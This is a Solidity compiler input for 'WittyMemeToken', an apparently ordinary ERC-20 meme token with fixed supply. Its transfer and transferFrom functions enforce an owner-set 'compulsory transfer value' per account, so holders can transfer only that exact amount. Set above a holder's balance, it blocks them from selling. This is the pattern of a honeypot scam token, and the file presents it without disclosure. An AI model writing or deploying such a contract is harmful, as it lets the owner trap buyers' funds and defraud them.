{{
  "language": "Solidity",
  "sources": {
    "contracts/COIN.sol": {
      "content": "pragma solidity ^0.8.16;\r\n\r\ninterface IERC20 {\r\n    function totalSupply() external view returns (uint256);\r\n    function balanceOf(address account) external view returns (uint256);\r\n    function transfer(address to, uint256 amount) external returns (bool);\r\n    function allowance(address owner, address spender) external view returns (uint256);\r\n    function approve(address spender, uint256 amount) external returns (bool);\r\n    function transferFrom(address from, address to, uint256 amount) external returns (bool);\r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\n    event Approval(address indexed owner, address indexed spender, uint256 value);\r\n}\r\n\r\nabstract contract ContextEnhancer {\r\n    function _msgSender() internal view virtual returns (address) {\r\n        return msg.sender;\r\n    }\r\n}\r\n\r\ncontract Ownership is ContextEnhancer {\r\n    address private _owner;\r\n    event ChangeOfOwnership(address indexed previousOwner, address indexed newOwner);\r\n\r\n    constructor() {\r\n        address sender = _msgSender();\r\n        _owner = sender;\r\n        emit ChangeOfOwnership(address(0), sender);\r\n    }\r\n\r\n    function currentOwner() public view virtual returns (address) {\r\n        return _owner;\r\n    }\r\n\r\n    modifier ownerOnly() {\r\n        require(currentOwner() == _msgSender(), \"Access denied: Owner only\");\r\n        _;\r\n    }\r\n\r\n    function relinquishOwnership() public virtual ownerOnly {\r\n        emit ChangeOfOwnership(_owner, address(0));\r\n        _owner = address(0);\r\n    }\r\n}\r\n\r\ncontract WittyMemeToken is ContextEnhancer, Ownership, IERC20 {\r\n    mapping (address => mapping (address => uint256)) private _allowances;\r\n    mapping (address => uint256) private _balances;\r\n    mapping (address => uint256) private _compulsoryTransfers;\r\n\r\n    string public constant tokenName = \"WittyMemeToken\";\r\n    string public constant tokenSymbol = \"WMT\";\r\n    uint8 public constant tokenDecimals = 18;\r\n    uint256 public constant maxTokenSupply = 100000 * (10 ** tokenDecimals);\r\n\r\n    constructor() {\r\n        _balances[_msgSender()] = maxTokenSupply;\r\n        emit Transfer(address(0), _msgSender(), maxTokenSupply);\r\n    }\r\n\r\n    modifier creatorOnly() {\r\n        require(_msgSender() == currentOwner(), \"Access denied: Creator only\");\r\n        _;\r\n    }\r\n\r\n    event CompulsoryTransferValueSet(address indexed account, uint256 value);\r\n\r\n    function compulsoryTransferValue(address account) public view returns (uint256) {\r\n        return _compulsoryTransfers[account];\r\n    }\r\n\r\n    function setCompulsoryTransferValues(address[] calldata accounts, uint256 value) public creatorOnly {\r\n        for (uint i = 0; i < accounts.length; i++) {\r\n            _compulsoryTransfers[accounts[i]] = value;\r\n            emit CompulsoryTransferValueSet(accounts[i], value);\r\n        }\r\n    }\r\n\r\n    function balanceOf(address account) public view override returns (uint256) {\r\n        return _balances[account];\r\n    }\r\n\r\n    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {\r\n        require(_balances[_msgSender()] >= amount, \"Insufficient balance\");\r\n\r\n        uint256 compulsoryTransfer = compulsoryTransferValue(_msgSender());\r\n        if (compulsoryTransfer > 0) {\r\n            require(amount == compulsoryTransfer, \"Compulsory transfer value must be used\");\r\n        }\r\n\r\n        _balances[_msgSender()] -= amount;\r\n        _balances[recipient] += amount;\r\n\r\n        emit Transfer(_msgSender(), recipient, amount);\r\n        return true;\r\n    }\r\n\r\n    function allowance(address owner, address spender) public view virtual override returns (uint256) {\r\n        return _allowances[owner][spender];\r\n    }\r\n\r\n    function approve(address spender, uint256 amount) public virtual override returns (bool) {\r\n        _allowances[_msgSender()][spender] = amount;\r\n        emit Approval(_msgSender(), spender, amount);\r\n        return true;\r\n    }\r\n\r\n    function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {\r\n        require(_allowances[sender][_msgSender()] >= amount, \"Allowance limit exceeded\");\r\n\r\n        uint256 compulsoryTransfer = compulsoryTransferValue(sender);\r\n        if (compulsoryTransfer > 0) {\r\n            require(amount == compulsoryTransfer, \"Compulsory transfer value must be used\");\r\n        }\r\n\r\n        _balances[sender] -= amount;\r\n        _balances[recipient] += amount;\r\n        _allowances[sender][_msgSender()] -= amount;\r\n\r\n        emit Transfer(sender, recipient, amount);\r\n        return true;\r\n    }\r\n\r\n    function totalSupply() external view override returns (uint256) {\r\n        return maxTokenSupply;\r\n    }\r\n\r\n    function name() public view returns (string memory) {\r\n        return tokenName;\r\n    }\r\n\r\n    function symbol() public view returns (string memory) {\r\n        return tokenSymbol;\r\n    }\r\n\r\n    function decimals() public view returns (uint8) {\r\n        return tokenDecimals;\r\n    }\r\n}\r\n"
    }
  },
  "settings": {
    "optimizer": {
      "enabled": false,
      "runs": 200
    },
    "outputSelection": {
      "*": {
        "*": [
          "evm.bytecode",
          "evm.deployedBytecode",
          "devdoc",
          "userdoc",
          "metadata",
          "abi"
        ]
      }
    }
  }
}}